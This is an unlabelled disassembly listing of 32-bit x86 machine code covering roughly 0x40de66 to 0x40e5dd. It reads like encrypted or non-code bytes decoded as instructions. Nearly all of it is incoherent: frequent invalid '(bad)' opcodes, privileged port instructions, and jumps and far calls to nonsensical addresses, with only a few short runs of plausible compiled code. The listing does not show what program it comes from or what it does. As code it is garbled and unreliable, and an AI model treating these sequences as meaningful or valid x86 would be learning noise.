  40de66:	sbb    DWORD PTR [esi-0x78],ecx
  40de69:	push   ss
  40de6a:	add    eax,DWORD PTR cs:[edx-0x6c781ae]
  40de71:	std    
  40de72:	xlat   BYTE PTR ds:[ebx]
  40de73:	cmp    DWORD PTR [esi+0x4a],edi
  40de76:	sbb    cl,bh
  40de78:	lods   eax,DWORD PTR ds:[esi]
  40de79:	fs pop es
  40de7b:	dec    edx
  40de7c:	sub    al,0x8a
  40de7e:	xlat   BYTE PTR ds:[ebx]
  40de7f:	stos   BYTE PTR es:[edi],al
  40de80:	jge    0x40de92
  40de82:	mov    esp,0x73d33615
  40de87:	je     0x40de2b
  40de89:	out    dx,al
  40de8a:	jno    0x40de8c
  40de8c:	dec    ecx
  40de8d:	loope  0x40de76
  40de8f:	mov    bl,0x2e
  40de91:	cli    
  40de92:	pop    ecx
  40de93:	dec    esi
  40de94:	popa   
  40de95:	(bad)  
  40de97:	and    bl,0x44
  40de9a:	pop    ebp
  40de9b:	je     0x40de2f
  40de9d:	inc    ebx
  40de9e:	cwde   
  40de9f:	(bad)  
  40dea0:	sub    eax,ecx
  40dea2:	std    
  40dea3:	cli    
  40dea4:	add    BYTE PTR ds:0x36126ebe,dl
  40deaa:	rcr    ecx,1
  40deac:	push   edx
  40dead:	leave  
  40deae:	loopne 0x40dee1
  40deb0:	lea    edi,[eax]
  40deb2:	add    edx,DWORD PTR [edx]
  40deb4:	daa    
  40deb5:	xor    ah,BYTE PTR [eax-0x30]
  40deb8:	sub    BYTE PTR [ebp+0x68],cl
  40debb:	and    BYTE PTR [ecx],dl
  40debd:	cdq    
  40debe:	push   cs
  40debf:	sub    ebp,ebx
  40dec1:	adc    al,0x57
  40dec3:	push   0xffffffbc
  40dec5:	inc    edi
  40dec6:	and    DWORD PTR [ebp-0x7a],ebp
  40dec9:	nop
  40deca:	mov    edx,ecx
  40decc:	mov    eax,0x1fcd6a30
  40ded1:	jge    0x40de9d
  40ded3:	and    BYTE PTR [ebx],ch
  40ded5:	iret   
  40ded6:	in     eax,dx
  40ded7:	call   0x60bb:0x9ee32fdf
  40dede:	sar    BYTE PTR [ecx],1
  40dee0:	stc    
  40dee1:	mov    al,ds:0x9132bf29
  40dee6:	rol    BYTE PTR ss:[ebp+0x19642917],0x0
  40deee:	adc    ecx,DWORD PTR [edi-0x34]
  40def1:	mov    ecx,0xd6cd33b0
  40def6:	outs   dx,DWORD PTR ds:[esi]
  40def7:	in     al,dx
  40def8:	repz inc ebx
  40defa:	cmp    bh,bl
  40defc:	imul   esp,DWORD PTR [ebx],0x4535b227
  40df02:	jmp    0x567660f
  40df07:	pop    ebx
  40df08:	sub    al,0xc5
  40df0a:	xchg   esp,eax
  40df0b:	and    edi,DWORD PTR [edx+ecx*4]
  40df0e:	enter  0x8031,0x81
  40df12:	xchg   ebx,eax
  40df13:	ss xchg ebp,eax
  40df15:	pop    ebx
  40df16:	mov    edx,0x47710bd7
  40df1b:	test   DWORD PTR [esi],ebp
  40df1d:	leave  
  40df1e:	(bad)  
  40df20:	cli    
  40df21:	add    DWORD PTR [esi],esi
  40df23:	fisub  DWORD PTR [esi+0xbc2200e]
  40df29:	cdq    
  40df2a:	add    DWORD PTR ds:0x95f1c503,0x548c5270
  40df34:	cli    
  40df35:	ret    
  40df36:	in     al,dx
  40df37:	jle    0x40df98
  40df39:	int    0xe7
  40df3b:	icebp  
  40df3c:	push   ss
  40df3d:	in     al,dx
  40df3e:	jns    0x40df8b
  40df40:	pop    esi
  40df41:	stos   DWORD PTR es:[edi],eax
  40df42:	xor    cl,cl
  40df44:	or     al,0xd5
  40df46:	mov    edi,0x6cf2a198
  40df4b:	cmc    
  40df4c:	inc    esp
  40df4d:	or     BYTE PTR [esi-0x4f],dh
  40df50:	mov    ebp,0x349f68b2
  40df55:	nop
  40df56:	or     eax,0xc7fcf0c9
  40df5b:	inc    ebp
  40df5c:	mov    esp,0xe2a8fdd5
  40df61:	sub    DWORD PTR [ecx-0x80],ecx
  40df64:	jmp    0x382ac341
  40df69:	or     ah,ch
  40df6b:	into   
  40df6c:	and    eax,0x8377eb02
  40df71:	xchg   esp,eax
  40df72:	nop
  40df73:	repnz push eax
  40df75:	jmp    0xeed2ae4b
  40df7a:	pop    edx
  40df7b:	cmp    ch,BYTE PTR [edx]
  40df7d:	loopne 0x40df0c
  40df7f:	xor    ch,cl
  40df81:	ins    BYTE PTR es:[edi],dx
  40df82:	loop   0x40dfa9
  40df84:	add    DWORD PTR [esi],esi
  40df86:	lahf   
  40df87:	and    DWORD PTR [ebx+ebx*4-0x6586d303],edi
  40df8e:	ret    
  40df8f:	aas    
  40df90:	loop   0x40df5b
  40df92:	or     al,0x20
  40df94:	std    
  40df95:	xor    cl,cl
  40df97:	dec    ebp
  40df98:	popa   
  40df99:	pop    ebp
  40df9a:	mov    eax,ds:0x9683f811
  40df9f:	add    ah,BYTE PTR [esi+0x50]
  40dfa2:	mov    esi,DWORD PTR [edi]
  40dfa4:	adc    ebp,DWORD PTR [ecx+0x13]
  40dfa7:	call   0x4a4f0f7
  40dfac:	cs inc eax
  40dfae:	xor    BYTE PTR [esi+eiz*8+0x28183a27],bh
  40dfb5:	(bad)  
  40dfb6:	add    ch,BYTE PTR [ebx-0x23]
  40dfb9:	aaa    
  40dfba:	cmp    al,0x7
  40dfbc:	jb     0x40e02e
  40dfbe:	and    esi,DWORD PTR [eax-0xfe93a58]
  40dfc4:	or     DWORD PTR [eax+0x7ee7c4e2],0x2f
  40dfcb:	mov    al,0xb5
  40dfcd:	mov    BYTE PTR [eax+0x3f],0x9f
  40dfd1:	lock mov ebp,0x2d2e2416
  40dfd7:	jnp    0x40df92
  40dfd9:	stc    
  40dfda:	mov    eax,ds:0x3fcc1c61
  40dfdf:	pop    ds
  40dfe0:	pop    ss
  40dfe1:	cmp    DWORD PTR [esi+0x12],ebx
  40dfe4:	shl    DWORD PTR [ebp-0x49],cl
  40dfe7:	imul   ebx,DWORD PTR [ecx+0x3a],0x17f92fb7
  40dfee:	idiv   edi
  40dff0:	dec    ebx
  40dff1:	mov    ah,0x84
  40dff3:	and    al,0xde
  40dff5:	mov    bl,0x3e
  40dff7:	ins    DWORD PTR es:[edi],dx
  40dff8:	push   edi
  40dff9:	dec    edi
  40dffa:	or     bh,dh
  40dffc:	int    0xf6
  40dffe:	test   al,0x87
  40e000:	call   0x71f8:0xba27a348
  40e007:	rcr    cl,0xe4
  40e00a:	(bad)  
  40e00b:	test   BYTE PTR [ebx-0x445b8c84],0xcb
  40e012:	push   0xffffff8c
  40e014:	fldcw  WORD PTR [edi+0x63]
  40e017:	lods   al,BYTE PTR ds:[esi]
  40e018:	fst    QWORD PTR [ecx+ebp*8-0x58]
  40e01c:	mov    cl,0x5a
  40e01e:	retf   0x1533
  40e021:	and    cl,BYTE PTR [esi+0x45]
  40e024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e025:	in     eax,0x86
  40e027:	sbb    DWORD PTR [eax+0x40],ebp
  40e02a:	bound  ecx,QWORD PTR [ecx-0x27]
  40e02d:	mov    bh,0x80
  40e02f:	inc    edx
  40e030:	add    al,0x42
  40e032:	lds    ebx,FWORD PTR [ecx-0x3]
  40e035:	jmp    DWORD PTR [ebx-0x236c7ec2]
  40e03b:	loop   0x40e0ba
  40e03d:	jns    0x40e0a0
  40e03f:	in     eax,0x56
  40e041:	sub    esp,DWORD PTR [ebp-0x65]
  40e044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e045:	ror    DWORD PTR [edx],0xa9
  40e048:	sbb    BYTE PTR [ebp+0x1f],bh
  40e04b:	jno    0x40e030
  40e04d:	call   0x4401422
  40e052:	retf   
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434296
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0x6900baa7
  40e071:	ins    BYTE PTR es:[edi],dx
  40e072:	xor    ecx,edi
  40e074:	xchg   edx,eax
  40e075:	jo     0x40e0e7
  40e077:	dec    ecx
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e0c5
  40e07c:	jns    0x40e095
  40e07e:	inc    edx
  40e07f:	test   BYTE PTR [edi],ah
  40e081:	mov    dh,BYTE PTR ds:0xf31158ba
  40e087:	mov    BYTE PTR [edx-0x79],bl
  40e08a:	sbb    al,0xb3
  40e08c:	sub    edx,DWORD PTR [edx-0x11dba277]
  40e092:	adc    cl,BYTE PTR [edi]
  40e094:	inc    edi
  40e095:	addr16 dec ebx
  40e097:	pop    es
  40e098:	repz pop edi
  40e09a:	dec    esp
  40e09b:	inc    ebx
  40e09c:	faddp  st(2),st
  40e09e:	jg     0x40e084
  40e0a0:	das    
  40e0a1:	inc    edi
  40e0a2:	jecxz  0x40e0a1
  40e0a4:	adc    al,0x49
  40e0a6:	mov    ebp,gs
  40e0a8:	cld    
  40e0a9:	push   ss
  40e0aa:	pop    esi
  40e0ab:	pop    ds
  40e0ac:	rcl    BYTE PTR [edi],1
  40e0ae:	rcr    BYTE PTR [edi+edx*1+0x4e],cl
  40e0b2:	jecxz  0x40e0c0
  40e0b4:	test   BYTE PTR [edi+eiz*8-0x4b],ch
  40e0b8:	out    dx,al
  40e0b9:	popa   
  40e0ba:	jne    0x40e12d
  40e0bc:	pop    ss
  40e0bd:	cs inc eax
  40e0bf:	out    0xe,eax
  40e0c1:	test   BYTE PTR [edi+0x747c289e],0x13
  40e0c8:	mov    dl,0x6e
  40e0ca:	mov    ecx,DWORD PTR [edx+0x27]
  40e0cd:	out    0xc9,eax
  40e0cf:	adc    ebx,DWORD PTR [ebp+ecx*8+0x77233e50]
  40e0d6:	fs push 0xffffffdd
  40e0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0da:	fisubr DWORD PTR [edx]
  40e0dc:	(bad)  
  40e0dd:	jg     0x40e118
  40e0df:	push   edi
  40e0e0:	mov    eax,0xa90a91eb
  40e0e5:	arpl   WORD PTR [eax-0x46e66fd3],di
  40e0eb:	push   ebp
  40e0ed:	clc    
  40e0ee:	out    0x3a,eax
  40e0f0:	rol    BYTE PTR [esi],0x8c
  40e0f3:	jb     0x40e0af
  40e0f5:	sbb    BYTE PTR [edi+0x13],0xb7
  40e0f9:	bndstx [eax+0x67bc4d8d],(bad)
  40e100:	jmp    0x82a2:0x3d993f4b
  40e107:	outs   dx,DWORD PTR ds:[esi]
  40e108:	into   
  40e109:	(bad)  
  40e10b:	cs loop 0x40e141
  40e10e:	mov    BYTE PTR [ebx-0x38b5f148],dh
  40e114:	cli    
  40e115:	sar    DWORD PTR [eax-0x77],cl
  40e118:	retf   0xc662
  40e11b:	sbb    eax,ecx
  40e11d:	xor    bh,BYTE PTR [esi+0x700315ce]
  40e123:	lahf   
  40e124:	fisttp QWORD PTR [ebx-0x52205f9e]
  40e12a:	ds dec ebp
  40e12c:	lods   eax,DWORD PTR ds:[esi]
  40e12d:	rcr    BYTE PTR [esp+ebp*1-0x6ffb44ac],0xe
  40e135:	lock mov ah,0xd4
  40e138:	mov    ebp,0x4a15cac
  40e13d:	imul   esp,DWORD PTR ds:[ecx],0xffffffb1
  40e141:	pop    es
  40e142:	cwde   
  40e143:	xor    dl,BYTE PTR [ecx+0x7b4056a6]
  40e149:	aaa    
  40e14a:	push   edi
  40e14b:	jp     0x40e1cc
  40e14d:	iret   
  40e14e:	sub    ebp,esi
  40e150:	jmp    0x40e1b1
  40e152:	dec    esi
  40e153:	out    dx,eax
  40e154:	pop    esi
  40e155:	sbb    DWORD PTR ds:[eax-0xe],0xffffffe2
  40e15a:	(bad)  [esi-0x13d5061d]
  40e160:	(bad)  
  40e161:	retf   
  40e162:	sub    edx,eax
  40e164:	lds    edi,FWORD PTR [ecx+ecx*8-0x7b]
  40e168:	out    0xa0,eax
  40e16a:	stc    
  40e16b:	mov    esi,0xd312bc3
  40e170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e171:	or     eax,0x9069bf1f
  40e176:	(bad)  
  40e177:	mov    edi,0xdc003a88
  40e17c:	call   0xcd0ae37c
  40e181:	push   es
  40e182:	pop    eax
  40e183:	add    al,0xc
  40e185:	fstp   DWORD PTR [ebx+0x79]
  40e188:	lahf   
  40e189:	sub    al,0xee
  40e18b:	popa   
  40e18c:	mov    cl,0x5a
  40e18e:	imul   esp,DWORD PTR [esi+eiz*2+0x7b5f1a8b],0xe3b00fa
  40e199:	cmp    dh,BYTE PTR [esp+edi*1]
  40e19c:	repnz (bad) 
  40e19e:	mov    esi,0x8c9df5a9
  40e1a3:	fcmovnb st,st(5)
  40e1a5:	jno    0x40e1f7
  40e1a7:	inc    ebp
  40e1a8:	cmp    edi,DWORD PTR [ecx+0x88939b3]
  40e1ae:	add    al,0x6c
  40e1b0:	test   BYTE PTR [bx],0xc7
  40e1b4:	dec    esi
  40e1b5:	cmp    ax,0x8b86
  40e1b9:	scas   eax,DWORD PTR es:[edi]
  40e1ba:	add    BYTE PTR [ebp+0x2151a6d8],0x9e
  40e1c1:	lods   al,BYTE PTR ds:[esi]
  40e1c2:	push   eax
  40e1c3:	xchg   ebp,eax
  40e1c4:	xor    DWORD PTR [edi],eax
  40e1c6:	cli    
  40e1c7:	cmp    ebx,eax
  40e1c9:	cmp    eax,0x3c17b1e9
  40e1ce:	mov    BYTE PTR [eax-0x2],al
  40e1d1:	push   ebp
  40e1d2:	test   al,0xbe
  40e1d4:	dec    esp
  40e1d5:	ins    BYTE PTR es:[edi],dx
  40e1d6:	pop    ecx
  40e1d7:	cs mov dl,0xdc
  40e1da:	or     BYTE PTR [edi+ebp*8],ah
  40e1dd:	ds (bad) 
  40e1df:	jge    0x40e20a
  40e1e1:	mov    ch,0x1b
  40e1e3:	out    0x2c,al
  40e1e5:	xchg   edx,eax
  40e1e6:	and    BYTE PTR ds:0x373f1275,cl
  40e1ec:	xor    BYTE PTR [ebx],0x7e
  40e1ef:	push   ss
  40e1f0:	(bad)  
  40e1f1:	pop    ss
  40e1f2:	ja     0x40e246
  40e1f4:	fwait
  40e1f5:	pop    ss
  40e1f6:	fld    QWORD PTR [edi]
  40e1f8:	out    0x45,al
  40e1fa:	clc    
  40e1fb:	mov    eax,0x806dd479
  40e201:	sti    
  40e202:	or     dh,BYTE PTR [eax+0x50]
  40e205:	mov    bh,0xc0
  40e207:	ins    BYTE PTR es:[edi],dx
  40e208:	test   BYTE PTR [eax],bh
  40e20a:	mov    eax,ds:0x42e4273d
  40e20f:	(bad)  
  40e210:	lock not BYTE PTR ds:0x1ffccb81
  40e217:	mov    bh,0x65
  40e219:	repnz xor ecx,edx
  40e21c:	popa   
  40e21d:	adc    al,dl
  40e21f:	mov    dh,0xff
  40e221:	dec    eax
  40e222:	out    dx,eax
  40e223:	mov    BYTE PTR [ecx+esi*8+0x57],dh
  40e227:	xlat   BYTE PTR ds:[ebx]
  40e228:	fsub   st,st(4)
  40e22a:	clc    
  40e22b:	mov    bl,0x27
  40e22d:	mov    cl,0xa2
  40e22f:	out    dx,al
  40e230:	les    esp,FWORD PTR [edi-0x42]
  40e233:	inc    edx
  40e234:	sub    al,dh
  40e236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e237:	frstor [ecx-0x24]
  40e23a:	sar    esi,0x6a
  40e23d:	cwde   
  40e23e:	push   esp
  40e23f:	ret    0xec12
  40e242:	pop    edi
  40e243:	call   0xa137674b
  40e248:	push   eax
  40e249:	popf   
  40e24a:	mov    dh,0x9e
  40e24c:	mov    ds:0x8c96ffd9,eax
  40e251:	mov    ah,0xf7
  40e253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e254:	pop    ds
  40e255:	out    0xdc,al
  40e257:	dec    ecx
  40e258:	jecxz  0x40e1ec
  40e25a:	es cld 
  40e25c:	enter  0x12bc,0xad
  40e260:	lds    esp,FWORD PTR [ebx]
  40e262:	scas   al,BYTE PTR es:[edi]
  40e263:	inc    eax
  40e264:	mov    ebx,0xfa897eb7
  40e269:	dec    esi
  40e26a:	mov    al,0x4c
  40e26c:	push   ebp
  40e26d:	iret   
  40e26e:	int3   
  40e26f:	add    al,0xfd
  40e271:	cmp    ah,dh
  40e273:	or     eax,0x596e74f1
  40e278:	clc    
  40e279:	dec    ebx
  40e27a:	mov    ebp,esp
  40e27c:	call   0x37e9d255
  40e281:	ins    BYTE PTR es:[edi],dx
  40e282:	shr    BYTE PTR [eax-0x630244a3],0x3c
  40e289:	dec    WORD PTR [edx]
  40e28c:	add    eax,0xf7dc1c4f
  40e291:	add    al,0x18
  40e293:	data16 xlat BYTE PTR ds:[ebx]
  40e295:	shl    DWORD PTR [eax+0xd5106ce],0x31
  40e29c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e29d:	push   esp
  40e29e:	push   esi
  40e29f:	pop    ds
  40e2a0:	jno    0x40e2e9
  40e2a2:	jp     0x40e290
  40e2a4:	iret   
  40e2a5:	aas    
  40e2a6:	jns    0x40e26a
  40e2a8:	cmp    BYTE PTR [ebx-0x126349d9],bh
  40e2ae:	movsx  esp,WORD PTR [ebp-0x48]
  40e2b2:	repnz adc BYTE PTR [edx+0x7],dh
  40e2b6:	sub    dl,BYTE PTR [esi]
  40e2b8:	pushf  
  40e2b9:	xchg   edi,eax
  40e2ba:	scas   al,BYTE PTR es:[edi]
  40e2bb:	scas   eax,DWORD PTR es:[edi]
  40e2bc:	xlat   BYTE PTR ds:[ebx]
  40e2bd:	js     0x40e2c0
  40e2bf:	data16 (bad) 
  40e2c1:	and    BYTE PTR [edx+0x1159c97d],bl
  40e2c7:	popa   
  40e2c8:	fiadd  DWORD PTR [ebx]
  40e2ca:	arpl   WORD PTR [edi+0x289966d4],bx
  40e2d0:	xchg   esp,eax
  40e2d1:	addr16 and eax,0x7eb5ede7
  40e2d7:	mov    bl,0x46
  40e2d9:	mov    ds:0xef273ae7,eax
  40e2de:	sub    edi,DWORD PTR [ebp-0xa3ff09b]
  40e2e4:	cmp    BYTE PTR [esi+ebp*8],dh
  40e2e7:	sub    eax,0xeea05890
  40e2ec:	fisub  DWORD PTR [edi]
  40e2ee:	pop    edi
  40e2ef:	mov    bh,0xb2
  40e2f1:	cli    
  40e2f2:	int3   
  40e2f3:	xor    ebp,edx
  40e2f5:	sub    esi,edi
  40e2f7:	sub    esp,DWORD PTR [eax-0x7a]
  40e2fa:	pop    ecx
  40e2fb:	inc    esi
  40e2fc:	call   0xbf406573
  40e301:	int3   
  40e302:	ror    DWORD PTR [esi+0x68],1
  40e305:	pop    ss
  40e306:	add    esp,eax
  40e308:	jle    0x40e32a
  40e30a:	popa   
  40e30b:	xchg   ecx,eax
  40e30c:	paddusb mm7,QWORD PTR [edi]
  40e30f:	and    BYTE PTR [eax],dl
  40e311:	adc    eax,0x5c2ff2e0
  40e316:	test   eax,0x9e7e69bc
  40e31b:	mov    ds:0x90bb8972,al
  40e320:	add    al,0x68
  40e322:	jg     0x40e362
  40e324:	test   DWORD PTR [edx+ebp*1-0x4b],0x6ac16aec
  40e32c:	cmp    al,0x2
  40e32e:	into   
  40e32f:	mov    ds:0x1a687c92,eax
  40e334:	jbe    0x40e2f2
  40e336:	jne    0x40e30c
  40e338:	mov    ch,0xf4
  40e33a:	fcomp  QWORD PTR [eax+0x75]
  40e33d:	into   
  40e33e:	jle    0x40e348
  40e340:	push   es
  40e341:	sbb    edx,ecx
  40e343:	push   edi
  40e344:	mov    cl,0x74
  40e346:	(bad)  [ecx]
  40e348:	mov    ch,0x73
  40e34a:	sar    DWORD PTR [edx+0x7b9f118e],1
  40e350:	jo     0x40e345
  40e352:	test   BYTE PTR [eax],ah
  40e354:	shl    BYTE PTR [eax+0x779a57c0],1
  40e35a:	xor    eax,0xbec84f
  40e35f:	push   eax
  40e360:	ret    0x7028
  40e363:	in     eax,0x5
  40e365:	push   ecx
  40e366:	ins    BYTE PTR es:[edi],dx
  40e367:	pushf  
  40e368:	ins    BYTE PTR es:[edi],dx
  40e369:	arpl   WORD PTR [esp+eax*4+0x7c],ax
  40e36d:	not    BYTE PTR [eax+0x21]
  40e370:	enter  0x3b87,0xcc
  40e374:	push   ss
  40e375:	shl    DWORD PTR [edx],cl
  40e377:	mov    BYTE PTR [esi-0x20817702],0x6c
  40e37e:	arpl   WORD PTR [esi-0x4eaa75a7],bp
  40e384:	inc    esp
  40e385:	icebp  
  40e386:	ins    BYTE PTR es:[edi],dx
  40e387:	sub    ecx,DWORD PTR [esi-0x10]
  40e38a:	push   eax
  40e38b:	fimul  DWORD PTR [edx]
  40e38d:	push   ebp
  40e38e:	dec    ebp
  40e38f:	and    bl,0x4b
  40e392:	mov    bh,0xa7
  40e394:	pop    edi
  40e395:	push   esi
  40e396:	jmp    0xe1471de9
  40e39b:	je     0x40e341
  40e39d:	pop    sp
  40e39f:	pop    edx
  40e3a0:	pop    edi
  40e3a1:	dec    esi
  40e3a2:	clc    
  40e3a3:	mov    dh,0x3f
  40e3a5:	jl     0x40e38f
  40e3a7:	icebp  
  40e3a8:	jle    0x40e3e5
  40e3aa:	sub    BYTE PTR [ebx+eiz*2],ch
  40e3ad:	call   0xaa18ddb2
  40e3b2:	sub    ebp,DWORD PTR [ecx+ebx*1-0x2d]
  40e3b6:	bound  ecx,QWORD PTR [edx-0x71]
  40e3b9:	es dec esi
  40e3bb:	xor    esi,ebp
  40e3bd:	gs push edx
  40e3bf:	outs   dx,BYTE PTR ds:[esi]
  40e3c0:	mov    eax,0x37026ac3
  40e3c5:	push   ebp
  40e3c6:	mov    dh,0x8e
  40e3c8:	and    eax,0xaf0cbdaa
  40e3cd:	and    bh,BYTE PTR [esi+0x62]
  40e3d0:	fdivr  DWORD PTR [edx-0x1e]
  40e3d3:	xchg   esp,eax
  40e3d4:	sub    eax,0x1ae13051
  40e3d9:	scas   eax,DWORD PTR es:[edi]
  40e3da:	cli    
  40e3db:	mov    ch,0xe3
  40e3dd:	sbb    BYTE PTR [edx],ah
  40e3df:	int    0x6a
  40e3e1:	and    BYTE PTR [ebp-0x23],al
  40e3e4:	(bad)  
  40e3e5:	mov    bl,0x64
  40e3e7:	and    dl,cl
  40e3e9:	dec    esp
  40e3ea:	mov    dl,0xdd
  40e3ec:	push   esi
  40e3ed:	mov    bh,0xa7
  40e3ef:	shr    BYTE PTR [edi],1
  40e3f1:	enter  0xb1d5,0x44
  40e3f5:	mov    dh,0x93
  40e3f7:	shl    BYTE PTR [ebx+0x54],cl
  40e3fa:	add    BYTE PTR [edi+eax*8+0x65],ch
  40e3fe:	add    eax,0x8efc9347
  40e403:	daa    
  40e404:	jo     0xe2605724
  40e40a:	xchg   ebx,eax
  40e40b:	imul   ecx,DWORD PTR [esi+0x45],0x20
  40e40f:	sub    eax,0x1ed36a9
  40e414:	(bad)  
  40e415:	xchg   edi,eax
  40e416:	lea    esp,[esi]
  40e418:	cmp    DWORD PTR [eax+0x25b5b3a8],edx
  40e41e:	shr    DWORD PTR [ecx],cl
  40e420:	(bad)
  40e424:	or     edi,DWORD PTR [ecx-0xc]
  40e427:	adc    eax,0x2d4d3622
  40e42c:	mov    dl,0xac
  40e42e:	push   ss
  40e42f:	into   
  40e430:	pop    ds
  40e431:	add    dl,BYTE PTR [eax]
  40e433:	pop    es
  40e434:	(bad)  
  40e435:	adc    BYTE PTR [esi],cl
  40e437:	repz xor eax,0xd36aaff1
  40e43d:	push   ss
  40e43e:	and    BYTE PTR [ecx+eax*8-0x72],bl
  40e442:	(bad)  
  40e443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e444:	xchg   BYTE PTR [esp+ebx*4-0x66ab1667],dh
  40e44b:	inc    ebp
  40e44c:	ror    DWORD PTR [edi-0x74750ae9],0xf
  40e453:	test   dh,bh
  40e455:	sbb    BYTE PTR [eax],al
  40e457:	add    BYTE PTR [edi],cl
  40e459:	mov    dh,0x5
  40e45b:	add    BYTE PTR [edx+0x43],0x0
  40e45f:	add    DWORD PTR ds:0x43431d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432cda,0x4325f0
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432cc2,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434292,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	repnz fldenv [eax+0x709ed2ee]
  40e4c0:	jo     0x40e50b
  40e4c2:	jge    0x40e534
  40e4c4:	jo     0x40e4c3
  40e4c6:	fidiv  WORD PTR [edx-0x1e]
  40e4c9:	inc    esp
  40e4ca:	psubsw mm3,QWORD PTR [eax]
  40e4cd:	adc    al,0xd4
  40e4cf:	cmovnp ebp,ebp
  40e4d2:	dec    eax
  40e4d3:	mov    edi,0x8ac384e6
  40e4d8:	call   0x29fc19a5
  40e4dd:	call   0x7f2b501b
  40e4e2:	or     eax,0x39c3901
  40e4e7:	(bad)  
  40e4e8:	in     al,dx
  40e4e9:	lods   al,BYTE PTR ds:[esi]
  40e4ea:	ret    0x6320
  40e4ed:	xchg   esp,eax
  40e4ee:	imul   ecx,DWORD PTR ds:0x5e8360b4,0x66
  40e4f5:	push   eax
  40e4f6:	aaa    
  40e4f7:	(bad)  
  40e4f8:	adc    BYTE PTR [ecx+0x9e1286d],bh
  40e4fe:	mov    eax,ds:0xf18ce4e8
  40e503:	mov    cl,0xc1
  40e505:	and    edx,DWORD PTR [edx-0x3df1f4fe]
  40e50b:	and    DWORD PTR [ecx+eax*1+0x38],ebp
  40e50f:	popf   
  40e510:	int    0xad
  40e512:	lds    esp,FWORD PTR [eax]
  40e514:	out    0x3e,eax
  40e516:	stos   DWORD PTR es:[edi],eax
  40e517:	outs   dx,BYTE PTR ds:[esi]
  40e518:	dec    edi
  40e519:	in     eax,dx
  40e51a:	dec    esp
  40e51b:	mov    bl,cl
  40e51d:	cmc    
  40e51e:	les    edx,FWORD PTR [esi+0x1d]
  40e521:	(bad)  
  40e522:	fisttp QWORD PTR [ebp+0x54]
  40e525:	icebp  
  40e526:	jl     0x40e4ef
  40e528:	sbb    edi,DWORD PTR [esp+ebx*1]
  40e52b:	jnp    0x40e4ef
  40e52d:	fdiv   DWORD PTR [ecx+eax*4-0x3546c93e]
  40e534:	out    0xf,eax
  40e536:	adc    eax,0x955f7a16
  40e53b:	mov    ds:0x3e1320da,al
  40e540:	cmp    DWORD PTR [ecx+0x305d51b5],ebp
  40e546:	mov    ds:0xb94cc93f,al
  40e54b:	clc    
  40e54c:	dec    edi
  40e54d:	inc    ecx
  40e54e:	inc    esi
  40e54f:	xchg   ecx,eax
  40e550:	adc    DWORD PTR [ebp+ecx*2-0x7d],esp
  40e554:	sbb    dl,BYTE PTR [eax]
  40e556:	jo     0x40e504
  40e558:	rol    ah,1
  40e55a:	fmul   st,st(4)
  40e55c:	hlt    
  40e55d:	popf   
  40e55e:	mov    bh,0xd9
  40e560:	dec    esi
  40e561:	loopne 0x40e5bb
  40e563:	std    
  40e564:	pop    esp
  40e565:	add    DWORD PTR [eax+0x5754d39c],edx
  40e56b:	outs   dx,DWORD PTR ds:[esi]
  40e56c:	mov    ebp,0x1683a393
  40e571:	dec    ecx
  40e572:	in     al,dx
  40e573:	dec    esi
  40e574:	sar    eax,1
  40e576:	push   ss
  40e577:	push   ds
  40e578:	xor    eax,0x1b23a672
  40e57d:	icebp  
  40e57e:	sub    bl,BYTE PTR ds:0x8d505e27
  40e584:	pop    ecx
  40e585:	adc    ebx,DWORD PTR [eax+0xa784a0f]
  40e58b:	not    DWORD PTR [esi+0x36e7db9e]
  40e591:	call   FWORD PTR [eax+0x64]
  40e594:	push   ds
  40e595:	jmp    0xdb6aebf2
  40e59a:	adc    al,0xf4
  40e59c:	xor    BYTE PTR [edx+ecx*4+0x41e7ff84],bh
  40e5a3:	mov    esp,DWORD PTR [edx*2+0x466c947]
  40e5aa:	and    cl,al
  40e5ac:	adc    BYTE PTR [ebp+0x6e],dh
  40e5af:	cmp    esi,DWORD PTR [edi]
  40e5b1:	sub    ch,BYTE PTR [edx-0x26]
  40e5b4:	nop
  40e5b5:	shl    BYTE PTR fs:[ebx+0x2c],0x4b
  40e5ba:	cld    
  40e5bb:	mov    bl,0x3d
  40e5bd:	adc    cl,BYTE PTR [edx+0x59]
  40e5c0:	ds hlt 
  40e5c2:	lea    esp,[eax+0x49]
  40e5c5:	xlat   BYTE PTR ds:[ebx]
  40e5c6:	xchg   esp,eax
  40e5c7:	cdq    
  40e5c8:	clc    
  40e5c9:	mov    BYTE PTR [ecx],bl
  40e5cb:	fcomi  st,st(2)
  40e5cd:	or     esi,DWORD PTR ds:0x7f3cdb6
  40e5d3:	ins    DWORD PTR es:[edi],dx
  40e5d4:	pushf  
  40e5d5:	nop
  40e5d6:	(bad)  [ebx]
  40e5d8:	ror    BYTE PTR [esi],cl
  40e5da:	or     edi,DWORD PTR [eax-0x6d]
  40e5dd:	call   0x8bd6:0xfaeba83a
